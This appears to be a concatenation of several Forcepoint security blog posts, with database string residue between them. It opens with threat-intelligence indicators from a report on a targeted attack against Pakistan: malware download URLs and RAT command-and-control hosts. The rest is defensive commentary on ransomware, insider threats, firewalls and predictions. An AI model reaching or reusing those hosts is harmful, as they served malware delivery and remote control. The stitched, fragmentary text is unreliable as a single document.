\nrange7.com/svcf.exe\nscholars90.website/ifxc\nscholars90.website/ifxc\nscholars90.website/cnhost.exe\nkart90.website/cnhost\nfrontier89.website/wmiserve\nreloadguide71.com/winter/iofs\ncreed90.com/ismr\nwester.website/uwe\nchinatel90.com/min\nwester.website/nqw\nscholars90.website/splsrv\n\n\n	RAT C2s\n\n\nranadey.net78.net/Muzic/exist.php\ninfo2t.com\nrange7.com/m2s_reply_u2.php\nwww.queryz4u.com\nwww.sportszone71.com/games/hill.php\nmicronet.no-ip.co.uk\nwww.inspire71.com/warzone/hill.php\nspiralbook71.com/warzone/hill.php\ngovsite.ddns.net\nrandomvalue90.com/warzone/hill.php\nmarvel89.com/ahead.php\ncloudupdates.servehttp.com\npickup.ddns.net\nmarvel89.com/msuds.php\nupdateservice.redirectme.net\npickup.ddns.net\ndestiny91.com/truen/adfsdsqw.php\nmedzone71.com/medal/adfsdsqw.php\nnexster91.com/winter/war.php', 'https://www.forcepoint.com/blog/security-labs/bitter-targeted-attack-against-pakistan\n');

', 'Susan HelmickSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', '﻿We’re only weeks away from revealing all the NEW security challenges we’re watching for in 2017. In anticipation, we examined last year’s predictions to see how accurately we judged security trends for 2016 and grade ourselves on the results.\n\n\n	Want to know what the next wave of Ransomware will look like? Or the impact AI may have on your organization’s data security? Forcepoint’s 2017 Security Predictions goes live in November. Register now for your region’s webcast and find out what’s coming next year.\n\n\n	The U.S. elections cycle will drive significant themed attacks: A+\n\n\n	Our first prediction proved true shortly after our 2016 report’s release with Anonymous launching an attack against the Trump Tower website on Dec. 11 and declaring “total war” on the candidate in early March 2016. The months that followed saw an alleged Russian hack of the Democratic National Committee, foreign hackers breaching state election systems and consideration by the Department of Homeland Security to add America\'s election system to its list of critical infrastructure.\n\n\n	Our prediction even described the potential for a “future cyber Watergate” – language that was echoed in remarks by U.S. House Democratic leader Nancy Pelosi and a former U.S. intelligence officer after the DNC breach who themselves described it as an “electronic Watergate” and “Watergate with a cyber twist.”\n\n\n	We gave ourselves an A+ for (unfortunately) getting almost every aspect of this prediction right.\n\n\n	Mobile wallets and new payment technologies will introduce additional opportunities for credit card theft and fraud: C\n\n\n	Last year we predicted that rapid chip and PIN implementations would drive cyber criminals to tamper with physical payment terminals. We also expected an increase in the hacking of increasingly popular payment methods (like the Venmo and Cash apps) and for malware authors to escalate efforts to steal from digital wallets. Although we didn’t see the number of breaches that we might have expected, there were a few events that led credence to our concern for such attacks.\n\n\n	At the Black Hat conference in Las Vegas this year, researchers showed how a vulnerability within major ATM makers and banks could be exploited to instruct an ATM to constantly draw out cash. In the same month, security researchers discovered vulnerabilities in Samsung\'s mobile payments app that could allow hackers to gain control of the device. Most recently, hackers accessed customer data from payment processing systems in handbag maker Vera Bradley’s stores via an installed program that tracked data contained in the magnetic stripes of payment cards.\n\n\n	While these new payment technologies have proven to present new opportunities for digital fraud and manipulation, as noted above, we didn’t (thankfully) see it much put into actual practice this year; for this we gave ourselves a C.\n\n\n	The addition of the gTLD system will provide new opportunities for attackers: B\n\n\n	While  not yet a challenge to .com, gTLDs (generic top-level domains) like .bank, .law, and .security, are certainly gaining ground. Respondents in a July 2016 survey felt these domains were providing more structure to the Internet. But these new gTLDs also created more security concerns. As these domains are still unfamiliar, users are often reluctant to provide these sites personal information.\n\n\n	This reluctance is no surprise when looking at statistics gathered by the Spamhaus Project, an organization tracking spam and related cyber threats. In tracking frequently used gTLDs, they’ve created a revolving list of Top 10 Most Abused Top Level Domains and their “Badness Index”. As of October 17th, the number one abused domain was .science - seen a total of 41,184 times with a full 36,334 of those categorized as bad.\n\n\n	Although we haven’t yet seen any large scale consequences of new/bad gTLDs, we gave ourselves a solid B for hitting the mark on their probability for being abused.\n\n\n	Cybersecurity insurers will create a more definitive actuarial model of risk – changing how security is defined and implemented: B+\n\n\n	We predicted that cyber insurance providers would begin to account for risk in more sophisticated ways in determining policy prices and coverage, including: looking at organizations’ cyber security culture and tools; industries in which they operate; and whether they’ve previously been breached.\n\n\n	In January 2016 the Center for Risk Studies at Cambridge University, along with eight leading modelling and risk assessment and insurance companies, published the Cyber Exposure Data Schema. This strategy aims to provide a uniform approach for insurance companies to assess and manage cyber risk, and conforms to our forecast.\n\n\n	On the other hand, while we anticipated an uptick in the adoption of cyber insurance outside of the U.S, an October survey showed a drop in the number of UK firms insured against cyber threats. However, Graeme Newman, director at CFC Underwriting in London, also stated that “The interest in cyber is phenomenal right now. It’s never been hotter…It feels like now it’s reached that stage of maturity where we’re seeing more and more buyers, we’re seeing more and more market participants, and everybody’s talking about cyber right now.” Marsh & McLennan Companies estimates the European cyber insurance market is growing by 50 to 100 percent annually.\n\n\n	We gave ourselves a B+ for correctly estimating the shift in risk assessment practices as well as overall global growth trends.\n\n\n	Data Theft Prevention (or Data Loss Prevention) adoption will dramatically increase in more mainstream companies: B\n\n\n	In 2016, cybersecurity regulations and cyber insurance continued to drive adoption of data loss prevention (DLP) solutions. EY’s Global Information Security Survey found that data leakage and data loss prevention were more important than incident response capabilities, security operations or security testing for 2016 for more than half of CIOs, CISOs, CFOs, CEOs and other information security experts. In August of this year, Gartner predicted 90 percent of organizations will implement a form of DLP by 2018.\n\n\n	Insider threats appear to be partly responsible for increases in DLP allocation. According to Accenture and HfS Research, 69 percent of enterprise security executives reported a theft or data corruption incident by an insider over the last year. And given the potential regulatory fines associated with lost data, not to mention legal complications and PR damage that could result, companies are increasingly looking to DLP solutions to keep from losing critical data.\n\n\n	For accurately predicting its adoption uptick, we gave ourselves a B for our view on DLP\n\n\n	Forgotten ongoing maintenance will become a major problem for defenders as maintenance costs rise, manageability falls and manpower is limited: B\n\n\n	We concluded that in 2016 attackers would worm their way into organizations via forgotten or abandoned systems. Only weeks after our report’s release, it was discovered that a software bug had erroneously set thousands of prisoners free long before their sentences required. The same month, the Federal Trade Commission (FTC) reached a settlement with Oracle on charges it deceived consumers running older versions of Java about the product’s security, though it was highly susceptible to malware. Then in January 2016, an Australian hospital was infected when malware infected machines in the hospital running on older Windows operating systems. In the same month UK banks were found to be using outdated SSL security that out them at high risk for attacks like POODLE. A few months later, advanced mobile malware that allowed attackers to monitor a victim in real time was found to have impacted up to half a billion older Android devices. This was followed in July by the discovery of a 20-year-old vulnerability in the Windows Print Spooler that allowed for watering hole attacks.\n\n\n	We gave ourselves a B for this prediction. While there were indeed incursions as a result of outdated software, and detection of vulnerabilities where such attacks could occur as a result, more diligence on the part of manufactures and security practitioners alike fortunately appear to have limited successful malware intrusions.\n\n\n	The Internet Of Things (IoT) will help (and hurt) us all: B\n\n\n	When coming up with our predictions last year, the infrastructure and security of the Internet of Things, especially as it pertained to Healthcare IoT and wireless technologies, were top of mind. We thought that the same technologies making medical care, home security, cars, and almost everything we use and interact with on a daily basis more efficient and beneficial would also cause significant security problems. We also theorized that the use of these internet connected devices at work might negatively impact business security.\n\n\n	In February, customers of smart alarm provider SimpliSafe were no doubt dismayed to find that their PINs could be harvested and alarms turned off from yards away. At Black Hat USA, a research firm gave evidence that Bluetooth devices, used for keyless entry and mPOS (mobile point of sale) functions, were vulnerable to cloning and unauthorized access.  A British investigation in September of this year found hundreds of thousands of devices – including webcams and baby monitors - vulnerable to digital eavesdropping. In the same month, Chinese researchers exploited vulnerabilities in one of Tesla’s vehicle models allowing them to take over the brakes, among other features. This month saw two new concerns. First, a Wi-Fi enabled insulin pump was found to be vulnerable to attacks that could disable it or alter commands that could not be fixed via the usual software updates. Then, a hosting service was hit with the largest DDoS attack ever seen using more than 150,000 IoT devices, including cameras and DVRs.\n\n\n	For correctly concluding the rise of IoT would see a concurrent rise in vulnerabilities, but because businesses have not yet been overly impacted, we gave ourselves a B.\n\n\n	Societal views of privacy will evolve, with great impact to defenders: B\n\n\n	In last year’s report we opined that data breaches and the loss of personally identifiable information (PII) would drive major shifts in the way in which privacy is perceived. Following publicized major consumer breaches, like Target, Home Depot and others, recent studies have shown that we are concerned about privacy and being the victim of a breach, just not enough to change our behavior.\n\n\n	In fact, earlier this year a Virginia judge ruled that for those using a computer connected to the Internet can’t reasonably expect privacy, writing in his statement that:\n\n\n	\"Hacking is much more prevalent now than it was even nine years ago, and the rise of computer hacking via the Internet has changed the public\'s reasonable expectations of privacy. Now, it seems unreasonable to think that a computer connected to the Web is immune from invasion. Indeed, the opposite holds true: In today\'s digital world, it appears to be a virtual certainty that computers accessing the Internet can—and eventually will—be hacked.\"\n\n\n	Further, the adoption of IoT devices in the home and the workplace means users constantly balance the right to privacy with the convenience gained by using a system that is constantly “on” and tracking activity. Fantastic benefits can be gained from permitting IOT devices to gather information that ﻿(consider the rapid adoption of IOT devices in the healthcare sector designed to collect personal data to be used by physicians), but decisions around limits of responsibility still need to be made.\n\n\n	Because who has the obligation for the storage, movement and processing of data still ultimately needs to be determined and will likely be played out for some time to come, our final prediction earns a B.﻿', 'https://www.forcepoint.com/blog/insights/look-back-our-2016-security-predictions-howd-we-do\n');

While newer cyber security safeguards sometimes get the fancy headlines, truly innovative firewalls are providing new levels of protection every day on the frontlines. Case in point: defending against Advanced Evasion Techniques (AETs, not to be confused with APTs, Advanced Persistent Threats).   Not all firewalls take the same approach.\n\n\n	Today’s attackers are increasingly using AETs to probe and sneak through traditional intrusion defenses, both at the edge and inside the network. While people might be most familiar with AETs coming from external sources, they are also playing a growing role in internal attacks. Malicious code that uses social engineering or other methods to hijack endpoints is now using AETs to circumvent internal protections that guard sensitive systems, often opening the door to larger, more destructive attacks. As a result, stopping AETs at the edge, inside enterprise networks, and in the cloud has become more important than ever.\n\n\n	This is an issue that is near and dear to our heart. Stonesoft Corporation (now a part of Forcepoint) was the pioneer in uncovering and defeating AETs. Ever since we discovered the first AETs in the wild in 2010, our Stonesoft Next Generation Firewall (NGFW) has incorporated a variety of threat-discovery techniques that examine network traffic across its different layers. Our approach not only identifies applications and users at a granular level, but also ensures that tricks such as out-of-order packet transmission or adulterated TCP Acknowledgements can’t be used to get malicious content through.\n\n\n	But, you don’t have to take our word for it. NSS Labs, one of the industry’s leading independent security testing organizations, has given our Stonesoft NGFW their highest rating of “RECOMMENDED” for 4 consecutive tests. And, this week, we were honored to have NSS Labs recognize our security products again with yet another “RECOMMENDED” rating in their new 2016 Next Generation Intrusion Prevention System Comparative Report (NGIPS).\n\n\n	In this latest test, NSS Labs tested a variety of other products, including dedicated IPS boxes. Not only did our Stonesoft platforms do as well or better than those IPS-only products, our solutions also provide next-gen firewalling, VPN connectivity, multi-link aggregation, cloud-based firewalling and so much more – all managed from a single console. Highlights from the report included:\n\n\n		Stonesoft NGFW received NSS Labs’ highest rating of “RECOMMENDED”.\n	\n		Our AET defenses proved effective against all attack evasion techniques tested.\n	\n		We blocked 100.0% of attacks against application-layer attacks and received a 99.9% security effectiveness core.\n	\n		The throughput of our Stonesoft N3301 measured 26% ABOVE our documented rate.\n	\n		Our Stonesoft solution passed all of the stability and reliability tests.\n\n	Why did we do so well? Well, we literally wrote the book on AETs (you can download a complimentary copy of Advanced Evasion Techniques for Dummies here).\n\n\n	At Forcepoint, we believe that intrusion protection is a crucial capability that needs to be available everywhere – in your firewalls, in internal network defenses, and in your software-defined networks in the cloud.

With the surge in activity, the FBI expects ransomware extortion losses to total $1 billion this year.\n\n\n	As the author of a recent white paper, titled “Are You Prepared for Ransomware?,” I have immersed myself into this topic and I\'d like to take the opportunity to provide a summary of what ransomware is, and what we can do about it. First, we should define the term: Simply stated, ransomware is the type of malware that blocks access to data and/or devices and demands payment for “a service” that will restore access. Until the ransom is paid, the data and/or devices will remain blocked.\n\n\n	Given the stakes, here are two other facts about ransomware that government agencies and private enterprises need to know – especially when it comes to preventing/avoiding the threats:\n\n\n	Ransomware comes in three main forms.\n\n\n	- Scareware. This is a demand for payment based upon the threat of a future action. For now, the victim’s files and system aren’t affected.\n\n\n	- Lockers. In this case, the affected user’s screen/system is blocked off, with the attacker indicating it will stay that way until the ransom is paid.\n\n\n	- Crypto-ransomware. With the victim’s files encrypted, the cyber crook offers to “sell” a decryption key for, of course, a fee. Crypto-ransomware can impact local files and those hosted on network shares. Encrypted files which cannot be retrieved result in a “data destruction” incident – which would be devastating.\n\n\n	To effectively respond to an attack, it’s key to recognize these forms. Once identified, your organization will inevitably debate the following, tough question: Do we pay or not? Unfortunately, there are no clear-cut right or wrong answers here. To make the decision even more complex, ransomware actors often keep demands relatively affordable and easy to pay. They’re intent on collecting money quickly and moving on to the next target.\n\n\n	We at Forcepoint™ can provide the following guidance: Making the payment is always an option, but it does not guarantee the successful return of encrypted files or device/computer usage. It’s also quite possible that the adversary will come back again with more threats and demands. Before agreeing to the terms, leadership must assess the availability of command and control servers on which the decryption key is hosted (will you get what you pay for?); the absence or presence of mistakes in the decryption routine (it might be possible to decrypt without the “official” key); and how “trustworthy” the cyber criminals appear with respect to actually making good on the terms (have your peers had success in retrieving their data and device/computer access?).\n\n\n	Ransomware thrives upon email, internet activity and social engineering. \n\n\n	Ransomware is more than just a piece of malware. Attacks often start with a phishing email and through a \"drive-by\" infection on a suspect web page. The first signs of malicious code are often infected programs that entice victims to download and execute them or delivered through email attachments (especially Microsoft Office-created ones). It applies constantly evolving, and often targeted, social engineering tactics to trick users into running, downloading or clicking on malicious content. With this, ransomware immediately starts enumerating all of the compromised system’s drives to search for target file types, and then proceeds to swiftly encrypt those files.\n\n\n	With the right monitoring and reporting tools, you can detect and defend your network from such attacks – before they have a chance to interrupt operations and squeeze you for money. A continuous user-education program will go far here too; inform employees about the dangers of ransomware, provide phishing education, and encourage them to report suspicious emails or incidents through an easy to use security incident program. Today’s workforce is increasingly cyber-savvy, and can be trained to identify potential social engineering schemes, check suspicious hyper-links, and understand the risks of opening unexpected or unfamiliar attachments in email.\n\n\n	While ransomware appears to dominate the current cybersecurity conversation, it really isn’t new. Its core components are based upon the same “penetrate and do bad things” principles that have driven hackers for decades. So defenses designed to cover the full threat lifecycle (aka Kill Chain) are particularly useful to defend against ransomware … detecting lures (phishing emails and drive-by web sites), identifying detection evasion tactics, recognizing exploits, and blocking malware.  User Behavior Analytics (UBA) are also powerful at the later stages of the attack with the ability to identify excessive file activity and alerting IT or proactively shutting down the activity.  More granular assignment of user access rights can limit the access of the ransomware to a smaller attack surface within the network, minimizing its impact.  A reliable backup program can dramatically reduce the overall impact and recovery time.  There are even economical backup options for road warriors and remote workers.\n\n\n	Subsequently, you will position your organization as highly guarded against ransomware threats. These crooks aren’t known for their patience, after all, as the classic “time is money” mantra usually dictates their MO. If you make it difficult enough for them to make a quick “sale,” they will move on. With the proper malware defense tools, procedures and awareness efforts in place, they will do just that.\n\n\n	Carl Leonard is Principal Security Analyst, Forcepoint Security Labs™', 'https://www.forcepoint.com/blog/insights/ransomware-what-organizations-need-know-how-avoid-it\n');

To add to this complexity aviation systems must function across civil and governmental boundaries as well as international boundaries.\n\n\n	Aviation involves a tremendous amount on the sharing of critical data between a wide variety of sources. Maintaining this unencumbered flow of data is essential to the rapid, accurate, and precise execution of almost all organizations today. But it must be performed in the most secure fashion to ensure not only that the right people have the right data when they need it but also to ensure that data integrity is maintained. The persistent threat of cyber-attack, network penetration, and data loss makes it necessary to use only the most secure methods to share and transfer data.\n\n\n	Data must be protected wherever it travels, even in a short journey from computer to printer. Dissemination of new information must carefully balance the need-to-know by consumers with the responsibility-to-share by providers. The right amount of sharing, governed by policies defining what information can cross domain boundaries, when, and under what circumstances, is highly context-dependent and dynamic. The result is a high-speed, efficient, cost-effective sharing process for even the most challenging data environments.\n\n\n	The transportation system and, specifically aviation, is an incredibly complex system with nearly immeasurable importance to global, modern life. The information and digital parts of this system continue to expand, from air traffic management, to aircraft technologies, and the devices humans -- as operators or passengers -- bring into the system.\n\n\n	﻿Consider that:\n\n\n		Aviation supports 57 million jobs and $2.2 trillion in economic activity.\n	\n		Every year some 2.8 billion people travel on 35,000 routes connecting 3,800 commercial airports.\n	\n		Together they fly 5.1 trillion kilometers—34,000 times the distance to the sun – and by 2030, twice as many people will fly.\n\n	Disruption of the aviation infrastructure would prevent any Air Navigation Service Provider (ANSP) from achieving its mission to provide the safest, most efficient aerospace system possible. More than ever, aviation infrastructures across the world rely on networked operations and net-centric data systems running on distributed enterprise architectures and are vulnerable to disruption caused by cyber-attack. The planned roll-out of large scale Air Traffic Management (ATM) modernization programs like the Next Generation Air Transportation System (NextGen) and Single European Sky ATM Research (SESAR) promise improvements and upgrades to increase the convenience and dependability of the associated aviation infrastructure.\n\n\n	Together, Raytheon and Forcepoint help organizations, government agencies (such as DoD, DHS and NOAA) and nations effectively minimize cyber risk and safeguard information and critical infrastructure. We are committed to active participation in this global issue and to delivering our proven capabilities in information assurance, user activity monitoring (to protect against the insider threat) and cybersecurity to meet the current and evolving challenges.\n\n\n	To learn more about Forcepoint cybersecurity, cross domain solutions, visit us at the Raytheon booth 413; Air Traffic Control Association (ATCA) Annual Conference', 'https://www.forcepoint.com/blog/insights/forcepoint-federal-focus-cybersecurity-critical-infrastructure-securing-global\n');

What’s not to like about watching everyday heroes battle the zombie “walkers” among us?\n\n\n	In fact, with National Cyber Security Awareness Month also taking place this month, I often view the ever-evolving phenomenon of the insider threat much like AMC’s zombie universe. It’s not easy to tell who will become a walker and when. So it’s best to assume that anyone and everything is an insider and, therefore, a potential insider threat – and everyone is a potential victim. This mirrors The Walking Dead since we know (spoiler alert) everyone is already infected with the zombie virus. What does this mean? Everyone and everything is a potential walker.\n\n\n	This state of vigilance would serve modern enterprises far better than broken cyber defense models centered on “keeping bad stuff out.” These outdated models depend on coupling disparate point solutions for perimeter defense – force fitting a new, separate solution every time attackers alter their methods. In today’s digital-first world, relying upon such a disjointed approach to prevent breaches is about as effective as attempting to avoid a herd of walkers by covering yourself with leaves: good luck.\n\n\n	After all, the perimeter we once knew no longer exists. Not that it’s as bleak as a post-apocalyptic Walking Dead world, but with the cloud, roaming users, mobility/BYOD and other innovations, the perimeter today is dictated by the location of data, user accounts and endpoints. Regardless of where these users and endpoints are located – on premise or off – they are insiders. And, by extension, we must consider every program and app running within user account and endpoint systems as insiders too.\n\n\n	To be clear, I’m not saying that security managers should no longer worry about external threats targeting their networks, but they cannot focus exclusively upon them either. We need to constantly watch for anomalous activity by users and devices as well as the use, storage, and movement of data, as potential indicators of insider-linked threats. One way to do this is to understand three common insider threat profiles. In a sense, they mirror certain qualities of characters from my favorite zombie show:\n\n\n	Accidental Insiders. These are employees who inadvertently cause harm. For example, if they’re participating in an industry-related social media chat, a hacker may pose as a helpful resource of information sending a URL which appears to relate to the discussion, but actually leads to malware. In The Walking Dead, these insiders call to mind Dale, a good-hearted victim who met his end while surveying the groups’ land for walkers and coming across an injured animal. Another example of accidental insiders are reckless insiders. These are employees who consider themselves “above the rules,” ignoring best practices from IT and even bypassing clearly articulated policies. While they are not acting maliciously, they invite risk. Though one could argue he is malicious, this type of insider reminds me of Merle Dixon. Merle foolishly (and fatally) put himself in harm’s way by taking unnecessary chances in addition to trusting the wrong person (the Governor).\n\n\n	Compromised Insiders. This insider has unknowingly had their machine or system compromised. After the compromise, their system is being controlled remotely and can be utilized to steal and/or leak data. Compromised insiders or hacked machines bring to mind most of the walkers in The Walking Dead. These individuals do not know that they are infected or compromised, and can be used by the living to protect or attack others. Walkers can be controlled to perpetuate attacks and, ultimately, more walkers.\n\n\n	Malicious Insiders. These users are clearly, purposefully up to no good. They are disgruntled, greedy and/or otherwise ill-intended individuals who misuse access to confidential intellectual property or systems. They often scheme to commit theft, sabotage and fraud within an organization. For example, an employee who has been hired by a competitor copies product schematics before resigning. In seasons one and two, Shane would make for the perfect malicious insider – especially when he intentionally injures and endangers others, with fatal consequences, for his personal vendetta.\n\n\n	Understanding common insider threat profiles remains an essential step in helping organizations eliminate damage – before it happens. So how can you mitigate this potential risk? From the human perspective, put all users through detailed training which educates them on best practices and how to recognize an adversary’s stealth techniques. At the same time, teach them how to spot possible malicious insiders through the classic “trouble signs” they project. On the tech side, organizations can complement their firewall and anti-virus tools with insider threat-centric ones related to authentication/access control, data loss prevention (DLP) and user behavior analysis.\n\n\n	Our whitepaper, “Unlocking Business Success: The Five Pillars of User Risk Mitigation,” details these – and other – steps to significantly increase your chances of monitoring, detecting and mitigating insider threats, ultimately helping you emerge unscathed. And that certainly beats being a walker.\n\n\n	Check out our fun take on this serious subject with The Walking Threat video below:', 'https://www.forcepoint.com/blog/insights/walking-threat-why-everybody-and-everything-brings-potential-cyber-risk\n');

I hear questions like this a lot at these events.\n\n\n	According to news reports, as far back as 2011 Wells Fargo employees purportedly fabricated millions of accounts in order to fraudulently achieve steep sales goals.  While thousands of employees were terminated for this conduct, that it went on so long undiscovered seems to indicate a more pervasive problem within the business no one was actively looking to detect.\n\n\n	While Forcepoint’s SureView Insider Threat (SVIT) can\'t monitor candor, it can detect when an employee is performing an account creation process on a bank’s internal application. SVIT has been doing screen scraping and collecting desktop video under these kinds of circumstances for many years. Unfortunately, it and other products can’t fix what no one can admit is broken. This is a key issue in cybersecurity.\n\n\n	In insider threat programs, many anomalies are detected though simple business intelligence practices. Take the case where an organization is concerned about privileged users who might be creating back doors into the network by creating unauthorized accounts on PC’s they can use later. Simple business intelligence analytics could compare the trouble tickets for new service requests to actual accounts being created by the privileged users to detect anomalies, or differences in the two streams. Business intelligence helps us identify when something is different, or anomalous, by comparing multiple streams of information and looking for differences and other outliers. There’s no user behavior analytics or machine learning algorithms required. A bank’s compliance or internal audit teams can detect fraudulent account activity with this kind of business intelligence. For instance, they might run a report of new accounts created in a given calendar year and check it against the telephone call records for the sales staff during the same time period. They might then discover a number of accounts created where there was no customer call to the sales team.   Would any of the affected Wells Fargo accounts created have appeared on such a list? I believe so.\n\n\n	What I do know is that SureView Insider Threat can cover gaps in user activity monitoring, but only if someone wants to look.\n\n\n	For more on the insider threat, click the below links:\n\n\n		How CISOs Tackle Insider Threat Data Protection\n	\n		Privileged User Abuse and the Insider Threat﻿\n	\n		9 Steps To Build a Better Insider Threat Program\n	\n		7 Profiles Of Highly Risky Insiders\n\n	For more on SureView Insider Threat click here.', 'https://www.forcepoint.com/blog/insights/minding-gap-user-activity-monitoring\n');

It identifies unknown risks and threats that accompany a specific piece of abandonware commonly used by the security research community. We have released our research in the form of a whitepaper. A download link is provided below.\n\n\n	“What started out as a simple ‘what-if?’ activity, quite literally set-up from the back rows of a talk at Blackhat Europe in 2015, soon turned into a long-term data collection and analysis project. I cannot overstate the surprise felt when we first looked at the data collected. The sheer volume of apparent users of an abandoned piece of software made us check, and re-check the data. Especially because we already knew some of the implications of what we were seeing.” Andy Settle, Head of Special Investigations.\n\n\n	\n\n\n	The Risks of Abandonware\n\n\n	Although usually a video gaming term, “abandonware” accurately reflects the use of software that has come to its end-of-life but, for a variety of reasons, is still in use. Reliance upon the convenience of automated updates have resulted in a complacency or false sense of security that can easily lead one to fail to appreciate the risks that come with using \"end-of-life\'d” software\".\n\n\n	Who is at Risk?\n\n\n	We identified previously unknown risks and threats that accompany a specific piece of abandonware commonly used by the security research community\n\n\n	Armed with the facts uncovered by this research, it is easy to imagine a scenario where ‘security researchers’, be they operating in China, Russia, Belarus, Iran, Ukraine, Iraq and North Korea, or even in South Korea, USA, Germany, UK, France, Canada or Finland, are compromised via the vulnerabilities that come with using such abandonware. Furthermore, regardless of whether such “security researchers” work for anti-virus companies, are malware authors themselves, or are developers of offensive capabilities, all of them are likely facing the same threats posed by their abandonware use and yet are totally unaware of it.\n\n\n	“The fact that we knew we were looking at data collected from the broader ‘security research’ community and knowing their locations had us thinking about plausible scenarios. It was, and still is reasonable to imagine a scenario where a malware author would be able to gain access to the infrastructure operated by an anti-virus vendor, where a foreign intelligence service would be able to access and control assets inside an international IT manufacturer or organised crime within a national Law Enforcement Agency.” Andy Settle, Head of Special Investigations.\n\n\n	Forcepoint actively chose to ‘sinkhole’ a lapsed domain. Consequently, the threats identified and discussed in this report will now only be theoretical. Furthermore, as a result of this ‘sinkholing’, Special Investigations were able to analyse the available data and highlight a number of critical security issues and vulnerabilities. The findings presented in this report also highlight a number of general, but equally important issues.\n\n\n	“Protecting the thousands of users of OllyDBG, an old \'favorite\' within the security research community, by sinkholing a domain, was only the beginning. We knew that by collecting data for a period of time, relating to the use of this commonly used reverse engineering tool, would enable us to develop greater insight that we could hopefully share.

News of these swift dismissals is being debated online and not everyone agrees the punishment fits the transgressions.\n\n\n	The employees worked in the cybersecurity department.  If a group of users in the Alibaba human resources department, instead of cybersecurity, had figured out how to trick the internal sales system into allowing them to order dozens of cookies through fraudulent means, would we have heard about this story? I doubt it; this story is important because it involves privileged users.\n\n\n	Employees in the cybersecurity department likely have the greatest understanding of the strengths and weaknesses of any information enterprise. It’s fair to assume that some of the Alibaba employees mentioned might have configured and maintained the underlying systems that enforce the required security controls. According to NIST a privileged user is a user that is authorized (and therefore, trusted) to perform security-relevant functions that ordinary users are not authorized to perform. Alibaba privileged users appear to have betrayed that trust since Wang Shuai, Alibaba\'s top PR official said the actions taken stand to remind employees that \"everything has a bottom line.\"\n\n\n	In Carnegie Mellon’s Common Sense Guide to Mitigating Insider Threats, Best Practice 10 suggests organizations should “institute stringent access controls and monitoring policies on privileged users” since privileged users pose a greater risk to organizations due to the elevated access they have to information systems and the data they contain.  In our 2016 Study on the Insecurity of Privileged Users more than 33 percent of commercial and federal IT practitioners said privileged users are not properly vetted — or don’t even have their backgrounds checked — prior to receiving access rights. The US Marine Corps reiterates this approach, emphatically stating in a Policy Letter that organizations must “thoroughly vet each privileged user to determine if this [user] should be placed in such a high position of trust…”\n\n\n	I’d argue privileged users also warrant a higher level of professional conduct standards in exercising their responsibilities. Let’s put this another way: Would you want one of these cyber security experts managing the cloud services security systems that are protecting your data, information systems, and intellectual property?   Though “everything has a bottom line”, circumstances determine where that line is drawn and how high or low it may be; this applies to privileged users.\n\n\n	The fact that members of the cybersecurity department were unaware of Alibaba’s monitoring of the internal sales system is also consistent with our 2016 Survey finding that information security departments are rarely responsible for insider threat programs. What problems might exist there if the same individuals also ran the auditing and monitoring program?\n\n\n	Privileged users:  select them carefully, require they maintain a high standard of professional conduct, and monitor their activity.', 'https://www.forcepoint.com/blog/insights/trust-risk-and-mooncakes-privileged-user-case-study\n');

Cybersecurity is always top of mind for me personally, but each October brings us the opportunity to educate a broader audience about its evolution and shifting landscape. I firmly believe awareness has to come from within an organization, so that a cybersecurity “knowledge culture” emerges. That’s what will enable enterprises to truly protect themselves.\n\n\n	This means employees at all levels and in all departments (not just IT) should stay on top of the most current trends. Below are four key areas we feel are too often overlooked. We will present a blog post each week during this month to dive deeper on these topics and further educate readers.\n\n\n		\n			Insider Threats. The “Insiders” who can threaten our networks are more than the classic “intentional” and “accidental” buckets we commonly think of.  I reviewed the “Seven Profiles of Highly Risky Users” a few months ago, and we will dedicate one blog to revisit this topic and explore how strategies to combat the threat have evolved.  But, regardless of the intent, the insider threat represents a real and growing problem:\n\n		\n				\n					Nearly three-quarters of information security professionals say their organization is vulnerable to these threats, according to survey research from Palerra. And only 42 percent feel they have appropriate controls in place to mitigate their exposure to insider risks.\n			\n			\n				\n					In our recent research report with the Ponemon Institute, “The 2016 Study on the Insecurity of Privileged Users,” we found that 49 percent of privileged users believe abuse within their ranks will increase over the next 12 to 24 months.\n			\n			\n				\n					And IT is hard-pressed to keep up. More than three out of five respondents in the Ponemon report said they can’t keep pace with the number of privileged user access change requests that emerge on a regular basis, and nearly one-third said it’s difficult to audit and validate privileged user access changes. At the same time, one-in-three admit that it’s too expensive to monitor and control all privileged users.​\n			\n		\n	\n		\n			Ransomware. You click on a file, but it fails to load or run. Then you try to call up several more – getting the same result. All of your colleagues are experiencing the same situation, with no access to mission-critical files and data. Then someone receives a message from a cyber crook: “We’ve locked up your files, but we’ll be happy to restore them – for a fee.”\n\n		\n			Few in IT today would fail to understand this ransomware scenario, or dismiss it with a casual “It will never happen to us,” attitude. Ransomware incidents per day have quadrupled over the past year. When we feature this topic in a couple weeks – with research taken from our recent white paper, “Are You Prepared for Ransomware?” along with some updated data points and perceptions from Forcepoint experts – we will explore how these attacks happen, and how to avoid them. We will also weigh in on a very tough question which inevitably comes up during such a crisis: Do you pay the bad guys, or not? (This question is also addressed in-depth in our white paper.)\n	\n	\n		\n			Privacy settings. Historically, IT has struggled to balance “Protection” with “Productivity.”  And now they have to add “Privacy” to that mix, further complicating their security options. With the rise of social media and internet usage for personal and professional reasons, users seemingly sprint their way throughout the online universe without thinking about privacy settings. To protect customer and proprietary data, users need help to understand the value and process for using the privacy capabilities they may not even be aware of.\n	\n	\n		\n			Network segmentation. While this may sound like something only IT professionals would understand – or care – about, users across the board should have a working knowledge of this trend. Fortunately, it’s not a difficult concept to grasp: network segmentation classifies data based upon how critical it is, and then takes these now-separated data clusters and stores them securely in individual, isolated domains. With this, adversaries who compromise a system may find themselves inside the network, but they keep running into “locked doors” when attempting to get to the segmented data. Even better (and here’s why the average user should care), network segmentation doesn’t disrupt business operations. If you’re authorized to call up information, you can do so – and safely transfer it as needed.\n	\n\n	We are excited to dive into all four of these topics in greater detail over the next several weeks. Please keep coming back to this space for our National Cyber Security Awareness Month blog posts. At Forcepoint, we believe that raising awareness ranks among our highest corporate duties – both internally and with our customers. If that sounds like the kind of company you’d like to work with, please contact us.', 'https://www.forcepoint.com/blog/insights/four-cybersecurity-trends-organizations-can%E2%80%99t-afford-overlook\n');

